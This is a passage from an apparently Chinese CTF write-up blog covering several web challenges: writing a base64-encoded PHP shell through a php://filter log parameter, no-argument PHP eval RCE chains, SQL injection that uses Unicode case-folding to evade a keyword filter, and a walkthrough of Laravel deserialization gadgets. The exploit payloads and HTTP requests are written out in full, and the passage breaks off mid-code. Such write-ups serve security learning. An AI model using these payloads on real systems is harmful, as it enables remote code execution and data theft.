126</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">domain=PD89YGNhdCAnLi4vLi4vLi4vZmxhZ19waHBtYWcxY191cjEnYDsvKioq&amp;log=://filter/write=convert.base64-decode/resource=shell.php/.</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2020/06/04/v4BpzdmSoRl1fLY.png" alt="18E49C67-5050-48F3-BA38-46CF64A84919.png"></p>
<p><u><strong>此处对shell的构造有坑，晚上填一下</strong></u></p>
<h2 id="0x04-phplimit"><a href="#0x04-phplimit" class="headerlink" title="0x04 phplimit"></a>0x04 phplimit</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目限制：函数可以多层嵌套但是最后一个不能包含参数.</p>
<h3 id="1-session-id"><a href="#1-session-id" class="headerlink" title="1.session_id"></a>1.session_id</h3><p>session_id用于设置和获取当前的会话id，也就是PHPSESSID的值，采用如下这种方式就可以获取当前的PHPSESSID的。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id(session_start())</span><br></pre></td></tr></table></figure></p>
<p>至于编码问题可以使用hex2bin()函数来解决，hex2bin()并不是将16进制转换为2进制，而是将16进制字符串转换为2进制字符串，示例如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $t=<span class="string">"7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b"</span>;</span><br><span class="line">php &gt; var_dump(hex2bin($t));</span><br><span class="line">string(<span class="number">48</span>) <span class="string">"print_r(file_get_contents('../flag_phpbyp4ss'));"</span></span><br><span class="line">php &gt; $tt=<span class="string">"print_r(file_get_contents('../flag_phpbyp4ss'));"</span>;</span><br><span class="line">php &gt; var_dump(bin2hex($tt));</span><br><span class="line">string(<span class="number">96</span>) <span class="string">"7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b"</span></span><br></pre></td></tr></table></figure></p>
<p>最终构造的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8084</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2020/06/04/qB45j72EhPvSmiR.png" alt="1BEFF8E8-E2FD-46F0-8FFA-1546502AEDD5.png"></p>
<h3 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars"></a>2.get_defined_vars</h3><p><img src="https://i.loli.net/2020/06/04/QreI4gdL2FV8Yny.png" alt="2D6D5105-7368-4C0D-890A-4784365E502E.png"></p>
<p>下面看一个示例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $b = <span class="string">"zeroyu"</span>;</span><br><span class="line">php &gt; $arr = get_defined_vars();</span><br><span class="line">php &gt; print_r($arr[<span class="string">"b"</span>]);</span><br><span class="line">zeroyu</span><br></pre></td></tr></table></figure></p>
<p>因为不能传入参数所以我们可以结合current()和next()函数来完成对变量的取值，最终构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=eval(next(current(get_defined_vars())));&amp;zeroyu=print_r(scandir(&apos;../&apos;));print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure></p>
<p>此外还可以使用reset来将数组指针定位到第一个位置进而获取我们想要的变量，从而构造payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?test=readfile(&quot;../flag_phpbyp4ss&quot;);//&amp;code=eval(implode(reset(get_defined_vars())));</span><br></pre></td></tr></table></figure></p>
<p>之前提到过牌glob函数，所以payload还可以这样写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=eval(next(current(get_defined_vars())));&amp;b=var_dump(glob(%27/var/www/*%27));print_r(file_get_contents(&apos;../flag_phpbyp4ss&apos;));</span><br></pre></td></tr></table></figure></p>
<h3 id="3-getcwd"><a href="#3-getcwd" class="headerlink" title="3. getcwd"></a>3. getcwd</h3><p>getcwd()函数是获取当前目录，所以通过切换目录读文件的方案也是可行的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></p>
<p>PS:附加几个小栗子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class="line">?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class="line">?cmd=print(dirname(dirname(getcwd()))); print出/var/www</span><br></pre></td></tr></table></figure></p>
<h3 id="4-getallheaders"><a href="#4-getallheaders" class="headerlink" title="4.getallheaders"></a>4.getallheaders</h3><p>getallheaders()可以获取全部HTTP请求头信息，从而伪造HTTP头字段就可以达到RCE效果，但是这个函数是apache_request_headers函数的别名，只适用于apache环境对于本题目是没有作用的。</p>
<p>关于这个函数的使用，可以参考RCTF 2018的r-cursive题目。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class="line">cmd: phpinfo(); //</span><br></pre></td></tr></table></figure></p>
<p>PS:那道题目中还涉及到利用open_basedir进行沙盒逃逸</p>
<h3 id="5-getenv"><a href="#5-getenv" class="headerlink" title="5.getenv"></a>5.getenv</h3><p>这个函数再PHP5.6版本下不能使用，但是在PHP7.1以及以上版本是可以在不加参数的情况下像get_defined_vars()一样获取服务段的env数据。</p>
<h2 id="0x05-nodechr"><a href="#0x05-nodechr" class="headerlink" title="0x05 nodechr"></a>0x05 nodechr</h2><p>此题目考察一些javascript的小特性：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从源码上看是很明显拼接直接注入，但是select和union被过滤。</p>
<h3 id="1-toUpperCase-和toLowerCase-特性"><a href="#1-toUpperCase-和toLowerCase-特性" class="headerlink" title="1.toUpperCase()和toLowerCase()特性"></a>1.toUpperCase()和toLowerCase()特性</h3><p>因而利用JS的小特性进行绕过，具体参考<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">《Fuzz中的javascript大小写特性》</a></p>
<p>Fuzz代码如下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">String</span>.fromCodePoint) &#123;</span><br><span class="line">	(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> defineProperty = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="comment">// IE 8 only supports `Object.defineProperty` on DOM elements</span></span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="keyword">var</span> object = &#123;&#125;;</span><br><span class="line">				<span class="keyword">var</span> $defineProperty = <span class="built_in">Object</span>.defineProperty;</span><br><span class="line">				<span class="keyword">var</span> result = $defineProperty(object, object, object) &amp;&amp; $defineProperty;</span><br><span class="line">			&#125; <span class="keyword">catch</span>(error) &#123;&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;());</span><br><span class="line">		<span class="keyword">var</span> stringFromCharCode = <span class="built_in">String</span>.fromCharCode;</span><br><span class="line">		<span class="keyword">var</span> floor = <span class="built_in">Math</span>.floor;</span><br><span class="line">		<span class="keyword">var</span> fromCodePoint = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="keyword">var</span> MAX_SIZE = <span class="number">0x4000</span>;</span><br><span class="line">			<span class="keyword">var</span> codeUnits = [];</span><br><span class="line">			<span class="keyword">var</span> highSurrogate;</span><br><span class="line">			<span class="keyword">var</span> lowSurrogate;</span><br><span class="line">			<span class="keyword">var</span> index = <span class="number">-1</span>;</span><br><span class="line">			<span class="keyword">var</span> length = <span class="built_in">arguments</span>.length;</span><br><span class="line">			<span class="keyword">if</span> (!length) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">var</span> result = <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">while</span> (++index &lt; length) &#123;</span><br><span class="line">				<span class="keyword">var</span> codePoint = <span class="built_in">Number</span>(<span class="built_in">arguments</span>[index]);</span><br><span class="line">				<span class="keyword">if</span> (</span><br><span class="line">					!<span class="built_in">isFinite</span>(codePoint) || <span class="comment">// `NaN`, `+Infinity`, or `-Infinity`</span></span><br><span class="line">					codePoint &lt; <span class="number">0</span> || <span class="comment">// not a valid Unicode code point</span></span><br><span class="line">					codePoint &gt; <span class="number">0x10FFFF</span> || <span class="comment">// not a valid Unicode code point</span></span><br><span class="line">					floor(codePoint) != codePoint <span class="comment">// not an integer</span></span><br><span class="line">				) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="built_in">RangeError</span>(<span class="string">'Invalid code point: '</span> + codePoint);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (codePoint &lt;= <span class="number">0xFFFF</span>) &#123; <span class="comment">// BMP code point</span></span><br><span class="line">					codeUnits.push(codePoint);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123; <span class="comment">// Astral code point; split in surrogate halves</span></span><br><span class="line">					<span class="comment">// http://mathiasbynens.be/notes/javascript-encoding#surrogate-formulae</span></span><br><span class="line">					codePoint -= <span class="number">0x10000</span>;</span><br><span class="line">					highSurrogate = (codePoint &gt;&gt; <span class="number">10</span>) + <span class="number">0xD800</span>;</span><br><span class="line">					lowSurrogate = (codePoint % <span class="number">0x400</span>) + <span class="number">0xDC00</span>;</span><br><span class="line">					codeUnits.push(highSurrogate, lowSurrogate);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (index + <span class="number">1</span> == length || codeUnits.length &gt; MAX_SIZE) &#123;</span><br><span class="line">					result += stringFromCharCode.apply(<span class="literal">null</span>, codeUnits);</span><br><span class="line">					codeUnits.length = <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;;</span><br><span class="line">		<span class="keyword">if</span> (defineProperty) &#123;</span><br><span class="line">			defineProperty(<span class="built_in">String</span>, <span class="string">'fromCodePoint'</span>, &#123;</span><br><span class="line">				<span class="string">'value'</span>: fromCodePoint,</span><br><span class="line">				<span class="string">'configurable'</span>: <span class="literal">true</span>,</span><br><span class="line">				<span class="string">'writable'</span>: <span class="literal">true</span></span><br><span class="line">			&#125;);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">String</span>.fromCodePoint = fromCodePoint;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="string">'A'</span>.charCodeAt(); j &lt;= <span class="string">'Z'</span>.charCodeAt(); j++)&#123;</span><br><span class="line">	<span class="keyword">var</span> s = <span class="built_in">String</span>.fromCodePoint(j);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10FFFF</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> e = <span class="built_in">String</span>.fromCodePoint(i);</span><br><span class="line">		<span class="keyword">if</span> (s == e.toUpperCase() &amp;&amp; s != e) &#123;</span><br><span class="line">			<span class="built_in">document</span>.write(<span class="string">"char: "</span>+e+<span class="string">"&lt;br/&gt;"</span>);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最终可以得出以下几点特性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.toUpperCase() == &apos;I&apos;</span><br><span class="line">&quot;ſ&quot;.toUpperCase() == &apos;S&apos;</span><br><span class="line">&quot;K&quot;.toLowerCase() == &apos;k&apos;</span><br></pre></td></tr></table></figure></p>
<p>从而构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=test&amp;password=%27+un%C4%B1on+%C5%BFelect+1,(%C5%BFelect+flag+from+flags),&apos;3</span><br></pre></td></tr></table></figure></p>
<p>我们可以看一下这个payload经过处理之后是怎样的<br><img src="https://i.loli.net/2020/06/04/rTmCKdtoAf8GyhU.png" alt="5D317E21-AE8E-4A5E-A15A-80D1391CFE11.png"></p>
<p>PS: 补充另外一个JS的小特性，这个特性在<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/" target="_blank" rel="noopener">《Security Bugs in Practice: SSRF via Request Splitting》</a>中被使用</p>
<p><img src="https://i.loli.net/2020/06/04/U9mFsQtNZe8nSpu.png" alt="340A0E5E-C178-423A-ACF1-6C8100E5E7E1.png"></p>
<h3 id="2-unicode大小写转换问题"><a href="#2-unicode大小写转换问题" class="headerlink" title="2.unicode大小写转换问题"></a>2.unicode大小写转换问题</h3><p>在此处补充一下Python3的unicode大小写转换问题，造成这个问题的原因是</p>
<blockquote>
<p>这里的特殊部分是转换行为。 并非所有Unicode字符在转换为大写字母时都具有匹配的表示形式 - 因此浏览器通常倾向于采用外观相似，最适合的映射ASCII字符。 这种行为有相当大范围的字符，所有浏览器的做法都有所不同。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.upper() == &apos;I&apos;</span><br><span class="line">&quot;ſ&quot;.upper() == &apos;S&apos;</span><br><span class="line">&quot;K&quot;.lower() == &apos;k&apos;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>还有一些其其它的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">K ---- k</span><br><span class="line">ß(223) ---- SS</span><br><span class="line">ı(305) ---- I</span><br><span class="line">ſ(383) ---- S</span><br><span class="line">ﬀ(64256) ---- FF</span><br><span class="line">ﬁ(64257) ---- FI</span><br><span class="line">ﬂ(64258) ---- FL</span><br><span class="line">ﬃ(64259) ---- FFI</span><br><span class="line">ﬄ(64260) ---- FFL</span><br><span class="line">ﬅ(64261) ---- ST</span><br><span class="line">ﬆ(64262) ---- ST</span><br></pre></td></tr></table></figure></p>
<h2 id="0x06-lumenserial"><a href="#0x06-lumenserial" class="headerlink" title="0x06 lumenserial"></a>0x06 lumenserial</h2><h3 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>因为此题是基于laravel框架开发的，所以在本地要用 <code>composer install</code> 进行环境配置，方便后面的审计。</p>
<h3 id="2-phpggc"><a href="#2-phpggc" class="headerlink" title="2. phpggc"></a>2. phpggc</h3><p>这个题目是基于laravel框架开发的，phpggc中又恰好有4种关于Laravel框架RCE的payload生成方法，所以首先学习一下这四种payload的生成。</p>
<h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p><img src="https://i.loli.net/2020/06/04/vxsyGtKFm4WMlon.png" alt="1EE2E9E0-5236-4E90-983E-AA8AA94371D0.png"></p>
<p>从上图代码我们可以分析出反序列化的时候，类方法调用过程如下，首先执行如下语句，假设此时<code>$function</code>和<code>$parameter</code>参数分别对应<code>system</code>和<code>id</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Faker\Generator($function),$parameter);</span><br></pre></td></tr></table></figure></p>
<p>接着跟进到<code>\Illuminate\Broadcasting\PendingBroadcast</code>类中看到如下信息<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>将之前的<code>(new \Faker\Generator($function),$parameter)</code>代入其实执行的就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Faker\Generator($function)-&gt;dispatch($parameter);</span><br></pre></td></tr></table></figure></p>
<p>可看到将<code>Generator</code>当做函数调用进行使用了，所以直接查看到其中的如下代码，此时<code>__call</code>的参数是dispatch和id<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>之后跟进<code>format</code>函数进行查看，发现使用到了<code>call_user_func_array</code>函数来进行处理。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>继续跟进一下<code>getFormatter</code>函数，其中的参数是dispatch<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(sprintf(<span class="string">'Unknown formatter "%s"'</span>, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最终<code>getFormatter</code>函数将返回<code>system</code>。</p>
<p>PS：<code>__call</code>是在不存在对应的函数调用时才使用的。</p>
<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p><img src="https://i.loli.net/2020/06/04/nGRtrgNpxbYfZ8c.png" alt="34CC2E37-D469-460F-8940-A0F6F2ED3C48.png"></p>
<p>类似的进行分析，首先在反序列化时也是先进入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>针对<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Events\Dispatcher($function, $parameter),$parameter);</span><br></pre></td></tr></table></figure></p>
<p>对应执行的就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> \Illuminate\Events\Dispatcher($function, $parameter)-&gt;dispatch($parameter)</span><br></pre></td></tr></table></figure></p>
<p>要知道此时是有<code>dispatch</code>这个函数的，所以我们就继续跟进这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($event, $payload = [], $halt = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [$event, $payload] = <span class="keyword">$this</span>-&gt;parseEventAndPayload(</span><br><span class="line">        $event, $payload</span><br><span class="line">    );<span class="comment">//将$event设置为数组返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;shouldBroadcast($payload)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;broadcastEvent($payload[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $responses = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;getListeners($event) <span class="keyword">as</span> $listener) &#123;</span><br><span class="line">        $response = $listener($event, $payload);</span><br><span 